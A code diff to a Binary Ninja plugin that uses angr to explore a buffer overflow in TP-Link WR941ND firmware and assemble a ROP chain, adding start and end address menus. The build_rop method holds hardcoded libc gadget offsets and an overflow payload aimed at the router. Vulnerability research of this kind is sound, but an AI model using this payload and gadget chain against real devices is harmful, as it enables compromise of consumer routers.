@@ -24,8 +24,10 @@ registers = {"mips32": ['a0', 'a1', 'a2', 'a3', 's0', 's1',
              's2', 's3', 's4', 's5', 's6', 's7',
              't0', 't1', 't2', 't3', 't4', 't5',
              't6', 't7', 't8', 't9', 'v0', 'v1',
-             'sp', 'gp', 'pc', 'ra', 'fp']}
-
+             'sp', 'gp', 'pc', 'ra', 'fp'],
+             "arm32": ['r0', 'r1', 'r2', 'r3', 'r4', 'r5',
+             'r6', 'r7', 'r8', 'r9', 'r10', 'r11',
+             'r12', 'lr', 'sp', 'pc']}
 
 class Explorer(ABC):
     @abstractmethod
@@ -59,7 +61,15 @@ class MainExplorer(Explorer):
     
    
 
-class UIPlugin():
+class UIPlugin(PluginCommand):
+
+    def __init__(self):
+        super(UIPlugin, self).register_for_address("Angr\WR941ND\Start Address\Set", "Set execution starting point address", self.set_start_address)
+        super(UIPlugin, self).register("Angr\WR941ND\Start Address\Clear", "Clear starting point address", self.clear_start_address)
+        super(UIPlugin, self).register_for_address("Angr\WR941ND\End Address\Set", "Set execution end address", self.set_end_address)
+        super(UIPlugin, self).register("Angr\WR941ND\End Address\Clear", "Clear end point address", self.clear_end_address)
+        self.start = None
+        self.end = None
 
     @classmethod
     def dump_regs(self, state, registers, *include):
@@ -92,6 +102,81 @@ class UIPlugin():
                 block.function.set_auto_instr_highlight(
                     addr, HighlightStandardColor.NoHighlightColor)
 
+    def set_start_address(self, bv, addr):
+        try:
+            blocks = bv.get_basic_blocks_at(addr)
+            for block in blocks:
+                if(addr != self.start and self.start != None):
+                    block.function.set_auto_instr_highlight(
+                        self.start, HighlightStandardColor.NoHighlightColor)
+                    block.function.set_auto_instr_highlight(
+                        addr, HighlightStandardColor.OrangeHighlightColor)
+                    self.start = addr
+                    bv.set_default_session_data("start_addr",addr)
+                else:
+                    block.function.set_auto_instr_highlight(
+                        addr, HighlightStandardColor.OrangeHighlightColor)
+                    self.start = addr
+                    bv.set_default_session_data("start_addr",addr)
+            binja.log_info("Start: 0x%x" % addr)
+        except:
+            show_message_box("Afl-Unicorn", "Error please open git issue !",
+                             MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.ErrorIcon)
+
+    def _clear_address(self, block, addr):
+        for x in block:
+            x.function.set_auto_instr_highlight(
+                addr, HighlightStandardColor.NoHighlightColor)
+        addr = None
+
+    def clear_start_address(self, bv):
+        if self.start:
+            start_block = bv.get_basic_blocks_at(self.start)
+            self._clear_address(start_block, self.start)
+            self.start = None
+            bv.set_default_session_data('start_addr', None)
+        else:
+            show_message_box("Plugin", "Start address not set !",
+                                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
+            return
+
+    def set_end_address(self, bv, addr):
+        try:
+            blocks = bv.get_basic_blocks_at(addr)
+            for block in blocks:
+                if(addr != self.end and self.end != None):
+                    block.function.set_auto_instr_highlight(
+                        self.end, HighlightStandardColor.NoHighlightColor)
+                    block.function.set_auto_instr_highlight(
+                        addr, HighlightStandardColor.OrangeHighlightColor)
+                    self.end = addr
+                    bv.set_default_session_data('end_addr', self.end)
+                else:
+                    block.function.set_auto_instr_highlight(
+                        addr, HighlightStandardColor.OrangeHighlightColor)
+                    self.end = addr
+                    bv.set_default_session_data('end_addr', self.end)
+            binja.log_info("End: 0x%x" % addr)
+        except:
+            show_message_box("Plugin", "Error please open git issue !",
+                                MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.ErrorIcon)
+
+    
+    def clear_end_address(self, bv):
+        if self.end:
+            end_block = bv.get_basic_blocks_at(self.end)
+            self._clear_address(end_block, self.end)
+            self.end = None
+            bv.set_default_session_data('end_addr', None)
+        else:
+            show_message_box("Plugin", "End address not set !",
+                                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
+            return
+    
+    @classmethod
+    def display_message(self, title, desc):
+          show_message_box(title, desc,
+                                MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
 
 class AngrRunner(BackgroundTaskThread):
     def __init__(self, bv, explorer):
@@ -126,37 +211,47 @@ class BackgroundTaskManager():
 
     @classmethod
     def vuln_explore(self, bv):
-        self.init = cyclic(300).encode()
-        self.vulnerability_explorer = VulnerabilityExplorer(bv, 0x4703f0, 0x4706fc, ld_path='/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib')
-        pointers = self.vulnerability_explorer.set_pointers(arg0=self.init)
-        state = self.vulnerability_explorer.feed_function_state(pointers['arg0'])
-        self.vulnerability_explorer.set_sim_manager(state)
-        self.vulnerability_explorer.check_buffer_overflow(self.init)
-        self.runner = AngrRunner(bv, self.vulnerability_explorer)
-        self.runner.start()
+        try:
+            self.init = cyclic(300).encode()
+            start_addr = bv.session_data.start_addr
+            end_addr = bv.session_data.end_addr
+            self.vulnerability_explorer = VulnerabilityExplorer(bv, start_addr, end_addr, ld_path='/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib')
+            pointers = self.vulnerability_explorer.set_pointers(arg0=self.init)
+            state = self.vulnerability_explorer.feed_function_state(pointers['arg0'])
+            self.vulnerability_explorer.set_sim_manager(state)
+            self.vulnerability_explorer.check_buffer_overflow(self.init)
+            self.runner = AngrRunner(bv, self.vulnerability_explorer)
+            self.runner.start()
+        except KeyError:
+            UIPlugin.display_message('Addresses', 'Start or End address are not set')
 
     @classmethod
     def build_rop(self, bv):
-        self.proj = angr.Project(bv.file.filename, ld_path=[
-            '/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib'], use_system_libs=False)
-        self.libc = self.proj.loader.shared_objects['libc.so.0']
-        self.libc_base = self.libc.min_addr
-        self.gadget1 = self.libc_base+0x00055c60
-        self.gadget2 = self.libc_base+0x00024ecc
-        self.gadget3 = self.libc_base+0x0001e20c
-        self.gadget4 = self.libc_base+0x000195f4
-        self.gadget5 = self.libc_base+0x000154d8
-        self.sleep = self.libc_base + 0x00053ca0
+        try:
+            start_addr = bv.session_data.start_addr
+            end_addr = bv.session_data.end_addr
+            self.proj = angr.Project(bv.file.filename, ld_path=[
+                '/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib'], use_system_libs=False)
+            self.libc = self.proj.loader.shared_objects['libc.so.0']
+            self.libc_base = self.libc.min_addr
+            self.gadget1 = self.libc_base+0x00055c60
+            self.gadget2 = self.libc_base+0x00024ecc
+            self.gadget3 = self.libc_base+0x0001e20c
+            self.gadget4 = self.libc_base+0x000195f4
+            self.gadget5 = self.libc_base+0x000154d8
+            self.sleep = self.libc_base + 0x00053ca0
 
-        self.init = b"A"*160 + b"BBBB" + \
-            p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
-        self.rop_explorer = ROPExplorer(bv, self.proj, 0x4703f0, 0x4706fc, first=self.gadget1, second=self.gadget2,
-                                        third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
-        pointers = self.rop_explorer.set_pointers(arg0=self.init)
-        state = self.rop_explorer.feed_function_state(pointers['arg0'])
-        self.rop_explorer.set_sim_manager(state)
-        self.runner = AngrRunner(bv, self.rop_explorer)
-        self.runner.start()
+            self.init = b"A"*160 + b"BBBB" + \
+                p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
+            self.rop_explorer = ROPExplorer(bv, self.proj, start_addr, end_addr, first=self.gadget1, second=self.gadget2,
+                                            third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
+            pointers = self.rop_explorer.set_pointers(arg0=self.init)
+            state = self.rop_explorer.feed_function_state(pointers['arg0'])
+            self.rop_explorer.set_sim_manager(state)
+            self.runner = AngrRunner(bv, self.rop_explorer)
+            self.runner.start()
+        except KeyError:
+             UIPlugin.display_message('Addresses', 'Start or End address are not set')
 
     @classmethod
     def exploit_to_file(self, bv):
@@ -531,3 +626,8 @@ PluginCommand.register("Angr\WR941ND\Generate Exploit\Save to File",
                        "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)
 PluginCommand.register(
     "Angr\WR941ND\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
+
+if __name__ == "__main__":
+    pass
+else:
+    afl_ui = UIPlugin()
